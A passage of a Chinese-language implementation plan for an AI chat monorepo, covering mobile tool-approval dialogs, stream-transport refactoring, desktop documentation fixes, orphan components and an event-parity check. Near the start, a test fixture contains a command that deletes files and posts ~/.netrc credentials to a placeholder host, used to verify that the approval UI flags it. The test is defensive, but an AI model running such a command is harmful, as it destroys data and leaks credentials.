   - `pnpm --filter @ihui/web test -- tool-approval-summary` 绿：喂 `{command:"rm -rf /tmp/x && curl -d @~/.netrc https://h/i"}` 的审批事件，断言 (i) 命令本体在折叠态 DOM 中逐字存在（不被截断）、(ii) `含删除操作` 徽章出现、(iii) `curl` 可被查找命中 ≥1。
   - 反向对照 A：把 `StreamCode` 的 expandable 实现退回固定 `max-h-[200px]` 且去掉查找 ⇒ (i)/(iii) 红；反向对照 B：把 `commandHasDelete` 改成恒 `false` ⇒ (ii) 红（证明徽章由内容驱动，不是样式装饰）。
7. 依赖与顺序：步骤1/2 独立可派；步骤3 后置于 D142（其验收=行为断言"改错 scope 审批行为跟着变"）；步骤4 不排期（等 D158 拍板结果，避免两处加第四按钮互撞）。
8. 风险与回退：摘要错误比 JSON 更危险——命令族摘要**只重排不删字**（断言原文逐字可在），形状匹配误判的后果是"少一个徽章"不是"放行"；回退 = revert。**需 §24 拍板**（仅"换个做法"出口子项：新对外能力+与 D158 档位语义重叠风险）——预填方案：不新增按钮，先在"拒绝"理由输入旁加"要求换个做法"勾选（拒绝时携带 reason 文本回注 Agent），零新端点；批=按该最窄形态实施，不批=维持登记。

## 族 B · 跨端可达性（D135 D136 D137 D138 D148 D149）

> 本族全部锚点已于本轮在 HEAD 面逐条复跑（命令随条目给出）。两处推翻票面/文档的说法集中登记在 D137 第 2、8 栏与 D148 第 2 栏，摘要在文末「复验推翻清单」。
> 数字一律现读：引用处数均附命令，派单前须重跑。

### D135 端可达性①：RN 主聊天屏只接 7/30 回调，同端两套实现

1. **目标行为**：用户在 RN App 里跑一轮带工具调用/计划/终端的 agent 会话时，屏幕上能看见工具卡、计划进度、终端折叠行与用量，而不是只见流式正文；"手机上看不见 agent 在干什么"这一最大落差消除。
2. **现状锚点**（全部本轮复跑）：
   - 主屏调用点只接 7 个：`git show HEAD:apps/mobile-rn/src/screens/ChatScreen.tsx | sed -n '652,780p' | grep -oE "on[A-Z][A-Za-z]*:"` → onDelta/onReasoning/onError/onCitations/onInjectionApplied/onSteer/onDone（onPress 为 JSX 噪音）。
   - 缺失 23 名逐字与票面一致：api-client 30 回调面 `grep -oE "^  on[A-Z][A-Za-z]*\??:" packages/api-client/src/client.ts` 与上列 comm -23 → 23（本轮复算 MISSING_COUNT=23）。
   - "引擎写好没接线"成立：`chat-render-model.ts` 的 applyToolCallEvent:121 / applyToolDelta:175 / applyPlanUpdate:191 / applyTerminalStart:205 / applyTerminalEnd:351 在主屏零调用——主屏从该模块只 import `appendCitationFrames/applyInjectionFrame/appendSteerFrames/readSteerAppliedFromMetadata` + 3 类型（ChatScreen.tsx:128-135 实读）；唯一生产消费者是同端 `AiAssistantN8nScreen.tsx`（:147-155 import、:1472/:1489/:1497 调用，streamChat@:1412，本轮在 1412-2100 窗口数到 19 个 `on*:` 字面，文档口径 17/30 系与 30 名单交集——**全量逐名未取证**，派单先跑 `comm`）。
   - 行号漂移：票面"导航注册 RootNavigator.tsx:654"现读为 `:24` import + `:676` `<RootStack.Screen name="Chat" component={ChatScreen}/>`。
   - 已存在的等价物否证：不存在"另写引擎"必要——apply* 纯函数与 N8n 接线形态就是现成实现，本票确为**接线不是开发**。
3. **改动分解**：
   - 步骤 1【止血·接线】在 `ChatScreen.tsx`（包装层）streamChat 调用点补齐已有渲染器承接面的回调：onToolCall/onToolDelta/onPlanUpdate/onTerminalStart/onTerminalEnd/onUsage/onToolSummary 等，reducer 直接复用 `chat-render-model` 的 apply*（照抄 N8n 屏调用形态），产出喂给 `<SharedChatScreen>`（:2190 已在渲染，props 面见 D137）。
   - 步骤 2【根治·单一源】包装层与 N8n 屏两份"帧→state"调用序列必须收敛为一份：把帧分发逻辑上收 `packages/shared/src/chat/`（新文件 `frame-reducer.ts` [新]，纯函数、平台无关），两端各注入自己的 setState adapter（AGENTS §3 工厂/DI）；**禁止**第三份。
   - 步骤 3【降级形态】手机确实不便呈现的帧（onSubagent*/onTerminal* 全量视图）按端能力档案显式降级为单行折叠文本并在档案表登记（表 [新] `scripts/data/end-capability-profile.json` 现读 **ABSENT**，本体在 I 组 #97 票；本票步骤 3 与 #97 共建，先建表再由 #97 接门）。
4. **受影响文件**：apps/mobile-rn/src/screens/ChatScreen.tsx；apps/mobile-rn/src/screens/AiAssistantN8nScreen.tsx（改引共享 reducer）；packages/shared/src/chat/frame-reducer.ts [新]；packages/shared/src/chat/index.ts（导出）；scripts/data/end-capability-profile.json [新]（与 #97 共）。
5. **跨端与 i18n**：RN + packages/app（同屏体自动跟随）；web/cli/extension 不受影响；miniapp 走 D138。工具卡/终端行/计划行文案优先复用 RN 端既有 `aiChat.*` 键，缺的按 §19 五语言同批（新增键预计：`aiChat.terminalCollapsedLine`「终端输出（已折叠，{count} 行）」、`aiChat.subagentProgressLine`「子任务 {name}：{status}」）。
6. **验收判据**：① 第 2 栏 comm 命令重跑输出为空；② `git grep -l "applyToolCallEvent" HEAD -- apps packages | grep -viE "test|spec|chat-render-model.ts"` 命中 ≥2 个生产文件（现读 1）；③ 真机一轮含 3 个工具调用的会话截图（工具卡+状态可见）；④ 反向对照：把包装层 onToolCall 接线摘掉 → 端能力档案驱动的 parity 判据（#97）必须红。
7. **依赖与顺序**：与 D137 是同一"唯一实现"决策（票面已写明二选一不重复派单）——本轮复验后该决策实际**已由现状定型**（见 D137 第 8 栏），故两票可并为一张接线单派；不被其他票挡。
8. **风险与回退**：ChatScreen.tsx 3615 行巨型文件，并行会话在飞概率高（§12：改前 `git status --porcelain -- <file>` 判归属）；回退=单枚 revert。爆炸半径仅 RN 主屏渲染。**需 §24 拍板：否**（PROJECT_PLAN 已登记票的细化执行，§24 豁免）。

### D136 端可达性②：工具审批在 RN 与小程序聊天流零处理（信任型缺陷）

1. **目标行为**：手机上 AI 要执行高危操作时，用户被明确询问并可选三档授权；被拒则该操作确实没执行，且事后仍有人工放行入口——"我在受控模式下使用 AI"这个承诺在移动端成立。
2. **现状锚点**：帧在契约：contract.ts `TOOL_APPROVAL: 'tool-approval'`（:64-67 注释块含回传通道 `POST /llm/complete/stream/{session_id}/approval-response`，本轮实读）。三端已接：web=`apps/web/src/components/ai/tool-approval-dialog.tsx`（**注意在 ai/ 不在 chat/**；:83 decision approve/reject、:94-108 批准才带 scope）；extension=`apps/extension/entrypoints/sidepanel/components/ToolApprovalBanner.tsx`；cli=`apps/cli/src/commands/repl.ts:2464`（**路径修正：票面缺 commands/ 段**）工厂本体 `apps/cli/src/tools/danger-gate-audit.ts:116`（票面写的 `tools/danger-gate.ts` 是同名另一文件）。移动端零处理：`git grep -icE "tool-approval|toolApproval" HEAD -- apps/mobile-rn/src apps/miniapp-taro/src` 现读命中文件数=0。三档语义单一源：`packages/types/src/ai.ts:55 ToolApprovalScope = 'once'|'session'|'always'`。回传出口已在共享层：`packages/api-client/src/client.ts:3655` 一带有直连 approval-response 的 post 函数（注释实读，函数名派单前 `git show ... | sed -n '3640,3700p'` 现取）。**未取证**：ai-service 侧审批超时的具体数值与到点行为（dialog:91 仅注释"后端按超时兜底"）。
3. **改动分解**：
   - 步骤 1【止血·RN】包装层接 onToolApproval（D135 回调面之内），弹层复用 packages/app 对话框层做三档选择；回传走 api-client 现成 approval-response 出口，请求体逐字同 web（sessionId/scope/reason；拒绝不带 scope）。
   - 步骤 2【止血·小程序】`apps/miniapp-taro/src/api/index.ts` 事件分发表补 `tool-approval` 帧（与 D138 同文件同批改）+ Taro 弹层组件 [新]；同走 api-client 出口（D138 落地后天然可达；落地前可临时用 `Taro.request` 直连会被守门 73 判违规——**必须走 api-client，不得端内裸调**）。
   - 步骤 3【降级形态，票面硬要求】该端结构上无法即时应答的场景（App 后台/小程序切后台）：会话侧显示持久横幅「有 {count} 个操作等待审批，助手已暂停」，**发送侧不得静默自动批准**；服务端超时结论按"未应答=拒绝+可见暂停"呈现。超时具体语义待第 2 栏"未取证"格补测后写进票面。
   - 步骤 4【测试】两端各加：拒绝→断言副作用未发生（工具未执行、无授权落盘，不只断错误码）+ 被拒后人工放行入口在位（AGENTS §30）+ 三档齐全反向断言（只见两档即红）。
4. **受影响文件**：apps/mobile-rn/src/screens/ChatScreen.tsx；apps/mobile-rn/src/components/ToolApprovalDialog.tsx [新]（或经 @ihui/rn-app 共享弹层）；apps/miniapp-taro/src/api/index.ts；apps/miniapp-taro/src/components/ToolApprovalDialog.tsx [新]；packages/api-client/src/client.ts（仅确认出口，预期零改动）；packages/i18n/messages/{mobile-rn,miniapp-taro}/*。
5. **跨端与 i18n**：RN+miniapp 两新增面；web/extension/cli 现状即基线。键族按 web `editor.toolApproval`（zh 实读：title=工具审批 / description=AI 请求执行以下高危操作,请确认是否允许 / approve=批准 / reject=拒绝 / pendingCount=还有 {count} 个待审批）在两端同名登记，另新增 `toolApproval.pausedNotice`「有 {count} 个操作等待审批，助手已暂停」；§19 五语言同批 + 跑 i18n-diff/apply 流水线。
6. **验收判据**：① 两端真机各跑一条高危命令，截图含弹窗且三档可选；② `git grep -c "tool-approval" HEAD -- apps/mobile-rn/src apps/miniapp-taro/src` 均 ≥1；③ 副作用断言用例绿；④ 反向对照：把 scope 选择器删到两档 → 用例④必须红。
7. **依赖与顺序**：RN 侧被 D135 回调接线面挡（同文件同批做，建议并单）；miniapp 侧与 D138 补帧同批；服务端链路需 ai-service 在跑（本机无 PG/服务，§5b 实测——真机验收前先起 ai-service，起不了则降级为 ASGI in-process 测试）。
8. **风险与回退**：错误修复方向（默认放行/超时静默批准）比不做更糟，故所有兜底判序=「拿不到决策即拒绝且可见」。回退=摘接线枚 revert。**需 §24 拍板：是（一处）**——"移动端收到审批帧"改变了该端用户可见行为，且"无法应答时的呈现"票面未拍。预填方案（可直接批准）：三档文案与 web 逐字同（第 5 栏）；降级形态=持久横幅+发送侧暂停（步骤 3）；服务端超时行为在补测前一律按拒绝呈现，不新增任何自动批准。

### D137 端可达性③：packages/app 共享 AI 聊天屏导出在位、零消费方

1. **目标行为**（工程向）：读者与后继 agent 对"RN 主屏到底渲染哪一份实现"拿到一个可机器复验的事实，不再基于"零消费方"的错误前提做删除决策。
2. **现状锚点**——**本票复验推翻票面**：
   - `packages/app/src/index.ts:684` `export { ChatScreen } from './features/chat/ChatScreen'` 属实（实读）。
   - 但"全仓无人 import 它"**不成立**：`apps/mobile-rn/src/screens/ChatScreen.tsx:120` 经**多行 import** 引入 `ChatScreen as SharedChatScreen`（:123 `} from '@ihui/rn-app'`），并在 `:2190` 渲染 `<SharedChatScreen t={…} messages={sharedMessages} …/>`。票面的单行式 grep（同型见本轮派单方复现）会漏掉多行 import——这正是"孤儿组件自带测试判绿/单行 grep 判孤儿"教训的镜像形态。
   - 仍然成立的两半：`packages/app/src` 对 `@ihui/shared/chat` 引用数现读 0（该共享屏不消费共享渲染契约）；同包另 4 个聊天屏（Agent/Circle/Live/Message）确为端内薄包装直用。
3. **改动分解**：
   - 步骤 1【止血·改台账】把票面/文档 V4 #95 的"零消费方"改写为现读结论："已上屏（wrapper+共享壳），真缺口=① 包装层 7/30 接线（归 D135）② 共享屏不在渲染契约上"。证据指针用内容锚点不用行号（§1 规矩）。
   - 步骤 2【根治·契约决策登记】"共享屏改吃 `buildRenderModel` 的 RenderBlock[] 与 web/extension 同源" vs "维持 wrapper=流+state、shared=纯视图 的职责表" 二选一——推荐先登记职责表（现状即答案，零改动），契约统一与 D149 第 3 栏 web 投影收敛并成一张独立决策票，不在本票执行。
4. **受影响文件**：PROJECT_PLAN.md D137 行与 docs/AI_CHAT_BENCHMARK_ANALYSIS_V4.md #95 段（均为台账更正，随票落地，本计划不动盘）；若走契约统一：packages/app/src/features/chat/ChatScreen.tsx、apps/mobile-rn/src/screens/ChatScreen.tsx。
5. **跨端与 i18n**：packages/app 消费者仅 mobile-rn（本轮 grep 证实）；miniapp 不引 packages/app（平台事实，非缺陷）；无 i18n 改动。
6. **验收判据**：① `git grep -n "ChatScreen as SharedChatScreen" HEAD -- apps` ≥1（消费方存在性的正向证明，票面旧说法据此作废）；② 台账更正行的证据命令可重跑；③ 反向对照：谁把 :2190 渲染摘线 → D135 的端能力档案/S0 型摘线判据必须红（若尚无门，登记为 #97 的前置用例）。
7. **依赖与顺序**：原"等 D135 先定选哪份"已解除——复验表明"选哪份"问题本身不成立（两份是 wrapper 与被包壳，不是并行竞争实现）。可与 D135 并单。
8. **风险与回退**：**本票最大风险恰是按原票面执行**：若照"零消费方→落选那份删除"操作，会把正在上屏的共享 UI 壳整块删掉（§7 三问在第②问就会被拦：mobile-rn 没有等价实现可承接）。第 8 栏把这句显式写给派单人。纯台账更正零代码风险。需 §24 拍板：否（更正既有登记）。

### D138 端可达性④：小程序自写流式传输层，同一续传逻辑养两份实现

1. **目标行为**：用户在小程序里切网/息屏回来，续传与重连表现和 web 一致（不重复、不丢尾、不各修各的）。
2. **现状锚点**：端内自写层 `apps/miniapp-taro/src/lib/sse.ts`（enableChunked/H5 fetch 双通道 + Last-Event-ID + 指数退避 + 读超时 + AbortSignal；`git show HEAD:apps/miniapp-taro/src/lib/sse.ts | grep -cE "Last-Event-ID|retry|backoff|setTimeout"` 现读 20）与 `src/api/index.ts:536` streamSSE 调用点（实读注释逐字）；共享层 `packages/api-client/src/client.ts:2073/2122-2123` 同一 Last-Event-ID 续传（实读）。票面"client.ts:1011"现读为 streamChat 回调类型签名区（:1009-1013），重连实现真实落点 2073+——**行号按内容锚点引用**。缺帧 7 名（thinking/plan-step/question/start/tool-approval/budget/form_request）在 miniapp 两文件逐名 grep 现读全 0。**口径纪律**：事件名口径 23/30 与回调名口径 17/30 不得混写（本轮不重算全量，派单先各跑一遍并在票面标注口径）。
3. **改动分解**：
   - 步骤 1【根治·工厂化】api-client 传输层抽 `createStreamTransport({ fetchImpl, chunkedAdapter, storageAdapter })`：[新] `packages/api-client/src/transport/factory.ts` + `types.ts`；重连/退避/Last-Event-ID/dedupe 状态机**只此一份**（从现 client.ts 内联形态提出，行为逐字保持）。
   - 步骤 2【端内删自写层】`apps/miniapp-taro/src/lib/sse.ts` 收缩为 Taro `enableChunked` 平台 adapter（文件头按 §4 写 `// 平台特有:依赖 Taro API`），删除端内退避表与续传逻辑；`src/api/index.ts` 改调工厂产物 + 事件名分发保留端内（渲染端差异）。
   - 步骤 3【补帧】分发表补齐 7 帧：tool-approval 走 D136 弹窗，budget/form_request/question 至少做到**可见降级**（一行提示，不静默吞帧）。
4. **受影响文件**：packages/api-client/src/client.ts；packages/api-client/src/transport/factory.ts [新]；apps/miniapp-taro/src/lib/sse.ts；apps/miniapp-taro/src/api/index.ts；packages/i18n/messages/miniapp-taro/*（补帧文案）。
5. **跨端与 i18n**：web/extension/cli/RN/desktop 经 api-client 继承新工厂（行为不变即验收项）；H5 形态走 fetch adapter。新增键（zh 原文）：`ai.budgetNotice`「本轮预算已使用 {percent}%」、`ai.questionBanner`「助手在等你回答一个问题」、`ai.formRequestBanner`「助手请求填写一张表单」——§19 五语言同批。
6. **验收判据**：① `git grep -l "Last-Event-ID" HEAD -- apps/miniapp-taro packages/api-client | grep -viE "test|spec"` 只命中 packages/api-client 一个包面（**票面"全仓只落一个文件"不可达**：服务端 ai-service sse_buffer.py、apps/api sse-replay-buffer.ts、packages/shared sse-parse.ts 全仓非测试命中现读 11 个文件，服务端读该头是正当实现——验收必须限定在两客户端面）；② `pnpm --filter @ihui/miniapp-taro typecheck` 0 错误；③ 7 帧各有分发用例；④ 反向对照：把端内退避表原样抄回 lib/sse.ts → 判据①红。
7. **依赖与顺序**：票面"等契约建模两票先落"指 I 组（#99/#100 线）——票号以 runner/台账现读为准，本计划不钉死；tool-approval UI 依赖 D136。可独立派步骤 1-2（纯重构），步骤 3 随 D136 合批。
8. **风险与回退**：传输层是所有 miniapp SSE 消费者的咽喉，回归=断网/切后台/中途刷新三场景真机各一次；回退=revert 枚 + 过渡期可留 `IHUI_MINIAPP_LEGACY_SSE=1` 双通道旗（转正一个迭代后删）。需 §24 拍板：否（§3 工厂模式既定路径的架构重构，补帧文案属登记票细化）。

### D148 桌面端：三处口径互斥（薄壳是已拍板架构，矛盾才是缺陷）

1. **目标行为**（工程向）：任何人读 `tauri.conf.json`、`ensure-web-out.mjs` 头注、`docs/MULTI_END.md` 三处，得到同一个桌面端形态，且"桌面端 AI 版本由线上站点决定"这一事实与其风险被显式写明。
2. **现状锚点**：
   - ① `apps/desktop/src-tauri/tauri.conf.json`：`:8 beforeBuildCommand:""`、`:10 frontendDist:"shell"`、`:18 url:"https://aizhs.top/agents"`——三行本轮实读全部命中票面。
   - ② 票面路径失真：`scripts/ensure-web-out.mjs` 在 HEAD **不存在**，真实路径 `apps/desktop/scripts/ensure-web-out.mjs`；其头注 `:6-8` 不止自称"该契约的唯一校验点"，还写着 `frontendDist("../../web/out")`——与实际 `"shell"` 是**第二处**互斥（票面漏记）。新发现（对票面有利的一面）：`apps/desktop/README.md:29` 与 `src-tauri/README.md:53` **均已如实登记**"文件仍在、无任何配置引用、beforeBuildCommand 已置空"，故矛盾精确到"脚本头注 vs 配置+两份 README"，不是"全无人知"。
   - ③ `docs/MULTI_END.md` §2.5（:100-105）"React 18 + Vite、复用 @ihui/api-client/@ihui/types/@ihui/ui-react" vs `apps/desktop/package.json:16-17` 依赖仅 `@tauri-apps/cli`+`rimraf`——实读互斥成立。
   - ④ 防混淆：`package.json:9` build=`tauri build && node ../../scripts/desktop-artifact-single.mjs`——构建链上确有脚本，但其职责是 NSIS 安装包去重收敛（头注实读），与前端产物无关，不得误当"单产物校验点在跑"。
3. **改动分解**（= 分析文档方案 A，三处对齐；不采纳 B/C）：
   - 步骤 1【止血】改写 `apps/desktop/scripts/ensure-web-out.mjs` 头注：删"唯一校验点/frontendDist(../../web/out)"两处声称，替换为"历史遗留件，不在构建链（beforeBuildCommand 已置空）；恢复产物分发需同步改 tauri.conf.json 与本文件"。
   - 步骤 2【止血】`docs/MULTI_END.md` §2.5 按实读改写为"远程壳（线上站点渲染）+ Rust 本地能力层（托盘/深链/更新/通知）"，移除三个共享包复用与 React18+Vite 声称；`apps/desktop/package.json` 不加依赖（薄壳无 JS 前端是设计而非缺失）。
   - 步骤 3【根治·防回潮】把"互斥不再可能静默复发"做成最小断言：扩 `scripts/tests/desktop-artifact-invariant.test.mjs` 一条——若 `tauri.conf.json` 的 beforeBuildCommand 为空，则 `apps/desktop/**` 内不得出现"唯一校验点"字样（不含"不在构建链"限定语的）。是否升独立守门由持有人定，本计划只到测试断言。
   - 步骤 4 风险显式化：README 两处在既有如实登记后补一句"桌面端 AI 对话版本由 aizhs.top 线上部署决定，本仓不可校验；线上与本仓不一致时桌面端表现不属可复现范围"。
4. **受影响文件**：apps/desktop/scripts/ensure-web-out.mjs（仅注释）；docs/MULTI_END.md；apps/desktop/README.md；apps/desktop/src-tauri/README.md；scripts/tests/desktop-artifact-invariant.test.mjs。
5. **跨端与 i18n**：平台独占:desktop（其余 7 端零涉及，无 i18n）。
6. **验收判据**：① `git grep -n "唯一校验点" HEAD -- apps/desktop` 的每条命中 10 行内含"不在构建链/历史遗留"限定语；② §2.5 与 tauri.conf.json、package.json 三面对照表逐字一致（人工核对表贴票面）；③ 反向对照：把 §2.5 回写成"复用 @ihui/api-client"→ 断言步骤 3 红（该条判"唯一校验点"字样，§2.5 回写由对照表人工项兜住）。
7. **依赖与顺序**：无前置、可独立派；与 D135-D138 零交集。**边界（不得越）**：不得改产物分发、不得删脚本（V3 #72 拍板 + §7 删除安全——脚本作为"恢复产物分发"的现成件按 README:58 明示保留）。
8. **风险与回退**：纯文档/注释/测试，零运行时半径；回退=revert。需 §24 拍板：否（对齐既有拍板，不新增能力；分析文档中方案 B"真上产物分发"若有人想启用，属新对外行为，届时另开票拍板）。

### D149 孤儿件：对话流有一批组件写完没上屏

1. **目标行为**（工程向）：这 11 个组件每一个的"在库/在屏/被引用"三态与台账一致，注释不再宣称已删除而文件仍在；"共享抽象只服务一端"成为登记的决策项而非暗账。
2. **现状锚点**（逐项本轮复跑）：
   - 存在性：11 文件 `git cat-file -e HEAD:<path>` 全部 IN-HEAD（清单同票面）；`apps/web/src/components/chat/voice-note.tsx` HEAD **ABSENT** —— 票面"已否证"行属实，维持摘出、按 §12 归属未定不动不删。
   - 挂载性：按导入符号（import 语句或 `<Symbol`）grep、排除测试与非自身，11 个符号生产面命中**全为 0**（逐条命令：`git grep -lE "import[^;]*<Symbol>|<Symbol[ />]" HEAD -- apps packages | grep -viE "test|spec|__tests__"`）。两处同名假线索已排除：`connector-auth-card` 命中的是 RN 侧活件 `packages/app/src/features/chat/ConnectorAuthCard.tsx`（经 index.ts 导出供 mobile-rn，**非** web 孤儿的消费者，删除时严禁误伤）；`writing-block` 命中的是 `packages/shared/src/chat/index.ts:36 export * from './writing-block'`（shared 自己的同名模块，与 web 文件无关）。
   - 注释失真：票面"其邻居注释自称孤儿件已删除"现读落点为 `apps/web/src/components/sidebar-chat-history.tsx:211`（"孤儿件 ChatSearchBar 删除后该键的唯一消费者"）——双重失真：文件仍在（cat-file 已证），且"唯一消费者"也不实（`MessageList.tsx:184`、`search-result-list.tsx:58` 同用 `chatSearchBar` 命名空间，本轮 grep 实读）。
   - buildRenderModel：生产消费方仅 extension `MessageContent.tsx:737`（+2 处注释）；apps/web 面 `render-model` 零命中（实读）——"共享抽象只服务一端"成立。**未取证**：11 件各自"能力是否已被同端其他实现覆盖"须逐件读正文定性（本票只给分类框架，不代裁）。
3. **改动分解**：
   - 步骤 1【止血·修注释】改写 sidebar-chat-history.tsx:211 为现读事实（文件仍在 + 非唯一消费者）。
   - 步骤 2【分类处置】11 件按三分法逐件登记进票面：(a) 有承接票的接上（connection-status→G 组保真票，票号现读台账）；(b) 能力已有覆盖 → §7 三问 + 守门 99 存续性判据后"先迁后删"；(c) 未决 → 按 §1 新登记规矩写明"在等什么"（归属四态之一），不再挂裸待办。
   - 步骤 3【登记决策】"web 消息投影收敛到 buildRenderModel"开一条独立决策条目（触及 web message-list 十余组件，爆炸半径大），本票不动手。
4. **受影响文件**：apps/web/src/components/sidebar-chat-history.tsx（注释）；票面 11 路径按步骤 2 裁决逐个动（接上或删除，**本票不含 packages/app 的 ConnectorAuthCard.tsx**）；PROJECT_PLAN.md 处置表。
5. **跨端与 i18n**：web 面；RN 同名件另属其自身消费链（§9 不适用——非"端内缺实现"而是"web 内多写"）；无新增用户可见文案。
6. **验收判据**：① 11 文件逐条有处置行且证据命令可重跑（删除件 `git cat-file -e` 须 404 且 §7 三问答案在案；接上件生产面 importer ≥1 且排除测试面——本仓教训：组件自带测试让孤儿判绿）；② `git grep -n "孤儿件" HEAD -- apps/web` 命中注释与磁盘状态零矛盾；③ 反向对照：删除仍被渲染的件 → 守门 99 必须红。
7. **依赖与顺序**：connection-status 归 G 组保真票（编号以 PROJECT_PLAN 现读，勿照抄本文）；建议排在 D135 之后——接线票可能正是部分孤儿的消费方，先删后接等于二次开发。其余可独立派。
8. **风险与回退**：删除类是本仓最高危动作，逐件走 §7 三问 + 守门 99/71 链路，误删=revert + archive 锚点；回退单枚化。**需 §24 拍板：是（一处）**——(b)/(c) 类的最终处置属持有人裁决。预填方案（可直接批准的逐件建议）：connection-status→接上（随保真票）；chat-search-bar→保留并修注释（其 i18n 族键有 3 个活消费点）；connector-auth-card→先做"与 packages/app 同名 RN 件"的能力对照后择一；model-load-bar / cloud-chat-ops-card / edit-resend-rollback-confirm / move-to-worktree-dialog / annotation-anchor-label / input-notice-banner / input-source-cards / writing-block → 逐件跑 `git log -1 --format=%s -- <path>` 判立项意图后归 (b) 或 (c)，不预设删除。

---

## 复验推翻清单（本族实测 vs 票面/文档）

1. **D137"全仓无人 import"被推翻**：`apps/mobile-rn/src/screens/ChatScreen.tsx:120`（多行 import）+ `:2190`（渲染点）即消费方；"导出在位零消费方"是单行式 grep 的假孤儿。按原票执行删除会删掉正上屏的 UI 壳（§7 事故级）。
2. **D148 路径与范围失真**：`scripts/ensure-web-out.mjs` 在 HEAD 不存在，真实路径 `apps/desktop/scripts/ensure-web-out.mjs`；其头注另有 `frontendDist("../../web/out")` 第二处互斥（票面未记）；且两份 desktop README 已如实登记脱链状态——矛盾面比票面窄、可修面比票面清楚。
3. **D136 cli 路径修正**：`apps/cli/src/repl.ts` 不存在，实为 `apps/cli/src/commands/repl.ts:2464`（行号恰好全中），工厂本体在 `tools/danger-gate-audit.ts:116`（票面所指 `tools/danger-gate.ts` 是同目录另一文件）。
4. **D138 验收口径修正**："全仓 Last-Event-ID 只落一个文件"不可达（非测试命中现读 11 文件，服务端 5 处为正当实现），验收须限定 `apps/miniapp-taro + packages/api-client` 两客户端面；票面 client.ts:1011 实为签名区，续传实现落点 :2073/:2123。
5. **D135 行号漂移**：RootNavigator 注册现读 :676（票面 :654）；缺 23 回调名单与"主屏零调用 apply*（工具/计划/终端族）"均逐字复验成立。
6. **D149 注释失真升级**："唯一消费者"亦不实（chatSearchBar 命名空间另有 2 个活消费点）。

## 族 C · 尺子与取证卫生（D139 D140 D141 D150 D156 D157 D160 D167 D168 D169）

> 本文件只写实施计划，未改动任何代码或文档。所有现状数字均为 2026-09-28 当次现读，命令随条附出；
> 派单前必须重跑取现值（AGENTS §1「数字一律现读」）。

### D139 尺子①:对话流事件 parity 门只护 web,其余四端缺失结构性不可见(承 V4 #97,本条应排在端可达性各票之前;取证 2026-09-28 自验)

1. **目标行为**：某端漏接一个对话流事件时机器会点名，而不是只有 web 端被看守；"默认全端连通"从散文变成判据。
2. **现状锚点**（全部复验通过）：
   - `scripts/check-agent-event-parity.mjs:537` 消费面只有 `walk(path.join(ROOT,'apps/web/src'),…)`；全部门只有 3 个 walk 调用点（`:195`/`:207` 都走 `apps/api/src`，`:537` 走 web）⇒ 消费面确实只有 1 端 + `:585-594` 的 `packages/api-client/src/endpoints/agent-runtime.ts` case 分发。复验：`grep -n "walk(path.join(ROOT" scripts/check-agent-event-parity.mjs`。
   - `:809` 的报告文案自述"前端(apps/web + api-client)无人逐名消费"（复验：`sed -n '805,815p'` 同文件）——门把口径写在自己脸上，属"判据自证只护 web"。
   - 该门**不在提交链**：`grep -c agent-event-parity scripts/guardian-runner.mjs` = 0（同文件 `grep -c "script:"` = 189 道在册门），仅 `package.json:101`/`:119`（check:all）与 `.github/workflows/8end-consistency-cert.yml:37` 引用。
   - 各端确有真实消费文件（不是"恰好没有"）：`git grep -lE "streamChat|EventSource|onEvent" HEAD -- <端>` 现读 web 38 / miniapp-taro 5 / mobile-rn 6 / packages/app 2 / extension 3 / desktop 5 / cli 35。
3. **改动分解**：
   - 步 1（止血）：新增端能力档案表 `config/agent-event-end-capability.json` [新]，逐端声明支持的回调集合，每条带 `reason` + 未过期 `until`（形态照 `scripts/auth-handler-registration-exemptions.json` 的 `app+reason+reviewBy` 三段，**不要**按票面"挂守门 108"——见第 8 栏）。
   - 步 2（根治，两半同改）：判据侧把 `:537` 的单面 walk 换成"端清单由档案表键集推导"，同时把枚举面（目录表）一起换掉——AGENTS §4「给守门扩面必须同批改两半」，只改内容判据会整块静默失效而门照报绿。
   - 步 3（同批迁面）：本门 16 处 `readFileSync` 全按磁盘判（复验：`grep -c readFileSync scripts/check-agent-event-parity.mjs`），属守门 118 的 `loose-fs` 型；扩到六端必须同批改引 `scripts/lib/face-reader.mjs` 的 `catBatch`（导出口已复验：`FACES`/`catBatchOids`/`parseBatch`/`Undetermined`），否则新端的结论跟着滞后的共享工作树跑，在"恒红/假绿"之间来回跳。
   - 步 4（定级，先量再定）：先跑 `node scripts/check-agent-event-parity.mjs` 全量现读存量。**若 >0 则走棘轮**，锚点 = 该文件 HEAD 自身违规数（照 77/83/98/102 口径），不得当场 blocking。
   - 步 5（接线）：经 `scripts/gate-registry-insert.mjs` 以 HEAD 为底插入，环境变量 `GATE_SCRIPT`/`GATE_SKIP_ENV`/`GATE_MODE`/`GATE_TRIGGERS` 驱动；**编号一律现读**（该工具头注已记：取号同认 `id: 'NN'` 与 `id: "NN"` 两种形态；不设 triggers 时整键不写，空数组会让 `scripts/lib/guardian-triggers.mjs` 当场抛错并崩整条 pre-commit）。紧急跳过变量定为 `HUSKY_SKIP_AGENT_EVENT_PARITY_ENDS=1`。
4. **受影响文件**：`scripts/check-agent-event-parity.mjs`、`config/agent-event-end-capability.json` [新]、`scripts/guardian-runner.mjs`、`package.json`、`AGENTS.md`、`README.md`（工程守门节，`README.md:2787`）、`scripts/tests/check-agent-event-parity.test.mjs` [新]（§22c 镜像）。
5. **跨端与 i18n**：本票就是把 miniapp-taro/mobile-rn/packages/app/extension/desktop/cli 纳管，属"补齐 §9 默认全端连通"，不新增用户可见能力；判据内部的中文输出不是界面文案，**无需 i18n 键**。
6. **验收判据**：① 阳性对照（扩面真生效）——摘 `apps/web` 一处 `addEventListener` 必红、摘 **RN** 一处也必须红（只前者绿即"改了清单没改判据"）；② 档案声明"该端不做 X" ⇒ 不红但必须报名（不得静默）；③ 取不到面 ⇒ exit 2「无法判定」，不冒红不记绿；④ 装车证明：`git cat-file -e HEAD:scripts/check-agent-event-parity.mjs` 且 `grep -c agent-event-parity scripts/guardian-runner.mjs` ≥1（守门 89 的 R9 + "注册与脚本必须同枚入库"，见第 8 栏）；⑤ 反向对照：把 `:537` 的端清单退回硬编码 web ⇒ 镜像测试必须红。
7. **依赖与顺序**：可独立派；但 V4 #93/#94/#96（端可达性各票）应排在本票之后，否则补完的端接线没有尺子兜。与 D167/D157 无耦合。
